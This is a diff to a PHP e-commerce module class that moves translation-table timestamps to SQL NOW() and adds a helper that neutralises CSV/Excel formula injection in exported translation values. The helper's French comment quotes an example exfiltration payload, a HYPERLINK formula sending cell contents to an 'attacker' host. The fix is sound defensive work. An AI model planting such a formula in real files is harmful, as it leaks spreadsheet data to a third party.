@@ -2000,7 +2000,6 @@ class Neria extends Module
             $errors       = [];
             $firstErrBody = null;
             $firstErrCode = null;
-            $now          = date('Y-m-d H:i:s');
             $isFreeKey    = str_ends_with($deeplKey, ':fx');
             $apiHost      = $isFreeKey ? 'api-free.deepl.com' : 'api.deepl.com';
 
@@ -2093,8 +2092,8 @@ class Neria extends Module
 
                         Db::getInstance()->execute(
                             "INSERT INTO `{$tableTrad}` (`template`,`lang`,`translation_key`,`translation_value`,`is_custom`,`date_add`,`date_upd`)
-                             VALUES ('" . pSQL($tplKey) . "','" . pSQL($tplLang) . "','" . pSQL($row['translation_key']) . "','" . pSQL($result, true) . "',1,'{$now}','{$now}')
-                             ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($result, true) . "', `is_custom`=1, `date_upd`='{$now}'"
+                             VALUES ('" . pSQL($tplKey) . "','" . pSQL($tplLang) . "','" . pSQL($row['translation_key']) . "','" . pSQL($result, true) . "',1,NOW(),NOW())
+                             ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($result, true) . "', `is_custom`=1, `date_upd`=NOW()"
                         );
                         $translated++;
                     } catch (\Throwable $e) {
@@ -2205,7 +2204,6 @@ class Neria extends Module
 
             $isFreeKey = str_ends_with($deeplKey, ':fx');
             $apiHost   = $isFreeKey ? 'api-free.deepl.com' : 'api.deepl.com';
-            $now       = date('Y-m-d H:i:s');
             $translated = 0;
             $skipped    = 0;
             $errors     = [];
@@ -2264,8 +2262,8 @@ class Neria extends Module
                     try {
                         Db::getInstance()->execute(
                             "INSERT INTO `{$tableTradB}` (`id_abtest`,`lang`,`translation_key`,`translation_value`,`date_add`,`date_upd`)
-                             VALUES ({$idAbtestB},'" . pSQL($tplLang) . "','" . pSQL($row['translation_key']) . "','" . pSQL($result, true) . "','{$now}','{$now}')
-                             ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($result, true) . "', `date_upd`='{$now}'"
+                             VALUES ({$idAbtestB},'" . pSQL($tplLang) . "','" . pSQL($row['translation_key']) . "','" . pSQL($result, true) . "',NOW(),NOW())
+                             ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($result, true) . "', `date_upd`=NOW()"
                         );
                         $translated++;
                     } catch (\Throwable $e) {
@@ -3551,7 +3549,7 @@ class Neria extends Module
                     $row['template'],
                     $row['lang'],
                     $row['translation_key'],
-                    $row['translation_value'],
+                    $this->csvFormulaSafe((string) $row['translation_value']),
                     $row['is_custom'] ? '1' : '0',
                 ], ';');
             }
@@ -3576,7 +3574,6 @@ class Neria extends Module
 
                 $header  = fgetcsv($handle, 0, ';');
                 $count   = 0;
-                $now     = date('Y-m-d H:i:s');
 
                 while (($line = fgetcsv($handle, 0, ';')) !== false) {
                     if (count($line) < 4) { continue; }
@@ -3588,8 +3585,8 @@ class Neria extends Module
 
                     Db::getInstance()->execute(
                         "INSERT INTO `{$tableTrad}` (`template`,`lang`,`translation_key`,`translation_value`,`is_custom`,`date_add`,`date_upd`)
-                         VALUES ('" . pSQL($template) . "','" . pSQL($lang) . "','" . pSQL($key) . "','" . pSQL($value, true) . "',1,'{$now}','{$now}')
-                         ON DUPLICATE KEY UPDATE `translation_value` = '" . pSQL($value, true) . "', `is_custom` = 1, `date_upd` = '{$now}'"
+                         VALUES ('" . pSQL($template) . "','" . pSQL($lang) . "','" . pSQL($key) . "','" . pSQL($value, true) . "',1,NOW(),NOW())
+                         ON DUPLICATE KEY UPDATE `translation_value` = '" . pSQL($value, true) . "', `is_custom` = 1, `date_upd` = NOW()"
                     );
                     $count++;
                 }
@@ -3629,7 +3626,7 @@ class Neria extends Module
             fprintf($out, chr(0xEF).chr(0xBB).chr(0xBF));
             fputcsv($out, ['template', 'lang', 'key', 'value'], ';');
             foreach ((array) $rows as $row) {
-                fputcsv($out, [$tplKey, $tplLang, $row['translation_key'], $row['translation_value']], ';');
+                fputcsv($out, [$tplKey, $tplLang, $row['translation_key'], $this->csvFormulaSafe((string) $row['translation_value'])], ';');
             }
             fclose($out);
             exit;
@@ -3648,7 +3645,6 @@ class Neria extends Module
                 if ($bom !== chr(0xEF).chr(0xBB).chr(0xBF)) { rewind($handle); }
                 fgetcsv($handle, 0, ';'); // header
                 $count = 0;
-                $now   = date('Y-m-d H:i:s');
                 while (($line = fgetcsv($handle, 0, ';')) !== false) {
                     if (count($line) < 4) { continue; }
                     $key   = preg_replace('/[^a-z0-9_\.\-]/i', '', $line[2]);
@@ -3656,8 +3652,8 @@ class Neria extends Module
                     if ($key === '') { continue; }
                     Db::getInstance()->execute(
                         "INSERT INTO `{$tableTradB}` (`id_abtest`,`lang`,`translation_key`,`translation_value`,`date_add`,`date_upd`)
-                         VALUES ({$idAbtestB},'" . pSQL($tplLang) . "','" . pSQL($key) . "','" . pSQL($value, true) . "','{$now}','{$now}')
-                         ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($value, true) . "', `date_upd`='{$now}'"
+                         VALUES ({$idAbtestB},'" . pSQL($tplLang) . "','" . pSQL($key) . "','" . pSQL($value, true) . "',NOW(),NOW())
+                         ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($value, true) . "', `date_upd`=NOW()"
                     );
                     $count++;
                 }
@@ -3679,14 +3675,13 @@ class Neria extends Module
                 Db::getInstance()->execute(
                     "DELETE FROM `{$tableTrad}` WHERE `template` = '" . pSQL($tplKey) . "'"
                 );
-                $now   = date('Y-m-d H:i:s');
                 $batch = [];
                 foreach ($jsonData[$tplKey] as $lang => $fields) {
                     foreach ($fields as $fKey => $fVal) {
                         if (is_string($fVal)) {
                             $batch[] = sprintf(
-                                "('%s','%s','%s','%s',0,'%s','%s')",
-                                pSQL($tplKey), pSQL($lang), pSQL($fKey), pSQL($fVal, true), $now, $now
+                                "('%s','%s','%s','%s',0,NOW(),NOW())",
+                                pSQL($tplKey), pSQL($lang), pSQL($fKey), pSQL($fVal, true)
                             );
                         }
                     }
@@ -3716,15 +3711,14 @@ class Neria extends Module
 
             if (!empty($jsonData) && is_array($jsonData)) {
                 Db::getInstance()->execute("TRUNCATE TABLE `{$tableTrad}`");
-                $now   = date('Y-m-d H:i:s');
                 $batch = [];
                 foreach ($jsonData as $tpl => $langs) {
                     foreach ($langs as $lang => $fields) {
                         foreach ($fields as $fKey => $fVal) {
                             if (is_string($fVal)) {
                                 $batch[] = sprintf(
-                                    "('%s','%s','%s','%s',0,'%s','%s')",
-                                    pSQL($tpl), pSQL($lang), pSQL($fKey), pSQL($fVal, true), $now, $now
+                                    "('%s','%s','%s','%s',0,NOW(),NOW())",
+                                    pSQL($tpl), pSQL($lang), pSQL($fKey), pSQL($fVal, true)
                                 );
                             }
                         }
@@ -3942,14 +3936,12 @@ class Neria extends Module
                     // 3. Réinsère les valeurs d'usine depuis translations.json
                     if (!empty($jsonAll)) {
                         $batch = [];
-                        $now   = date('Y-m-d H:i:s');
                         foreach ($jsonAll as $fKey => $fVal) {
                             if (is_string($fVal)) {
                                 $batch[] = sprintf(
-                                    "('%s', '%s', '%s', '%s', 0, '%s', '%s')",
+                                    "('%s', '%s', '%s', '%s', 0, NOW(), NOW())",
                                     pSQL($tplKey), pSQL($tplLang),
-                                    pSQL($fKey), pSQL($fVal, true),
-                                    $now, $now
+                                    pSQL($fKey), pSQL($fVal, true)
                                 );
                             }
                         }
@@ -4071,7 +4063,6 @@ class Neria extends Module
                             $restoreKey = $entry['translation_key'];
                             $restoreVal = $entry['old_value'];
                             $tableTradB = _DB_PREFIX_ . 'neria_abtest_translation';
-                            $now        = date('Y-m-d H:i:s');
                             $employee   = $this->context->employee;
                             $author     = trim($employee->firstname . ' ' . $employee->lastname) ?: 'Admin';
 
@@ -4084,8 +4075,8 @@ class Neria extends Module
 
                             Db::getInstance()->execute(
                                 "INSERT INTO `{$tableTradB}` (`id_abtest`,`lang`,`translation_key`,`translation_value`,`date_add`,`date_upd`)
-                                 VALUES ({$idAbtestB},'" . pSQL($tplLang) . "','" . pSQL($restoreKey) . "','" . pSQL($restoreVal, true) . "','{$now}','{$now}')
-                                 ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($restoreVal, true) . "', `date_upd`='{$now}'"
+                                 VALUES ({$idAbtestB},'" . pSQL($tplLang) . "','" . pSQL($restoreKey) . "','" . pSQL($restoreVal, true) . "',NOW(),NOW())
+                                 ON DUPLICATE KEY UPDATE `translation_value`='" . pSQL($restoreVal, true) . "', `date_upd`=NOW()"
                             );
 
                             $histMgr->record(
@@ -6915,6 +6906,25 @@ class Neria extends Module
             $type === 'error' ? 'neria_error' : 'neria_success',
             $msg
         );
+    }
+
+    /**
+     * Neutralise l'injection de formule CSV/Excel (=, +, -, @, tab, CR) avant
+     * fputcsv() — translation_value est une valeur librement éditée par un
+     * utilisateur BO (formulaire ou import CSV), jamais restreinte par
+     * regex contrairement à template/lang/key. Une valeur du type
+     * =HYPERLINK("http://attacker/steal?x="&A1) exécutée/évaluée à
+     * l'ouverture du CSV exporté dans Excel/LibreOffice par un
+     * administrateur avec des droits plus larges. Préfixer d'une
+     * apostrophe force l'interprétation en texte brut par le tableur, sans
+     * altérer la valeur telle que stockée/réimportée en base.
+     */
+    private function csvFormulaSafe(string $value): string
+    {
+        if ($value !== '' && strpbrk($value[0], "=+-@\t\r") !== false) {
+            return "'" . $value;
+        }
+        return $value;
     }
 
     /**
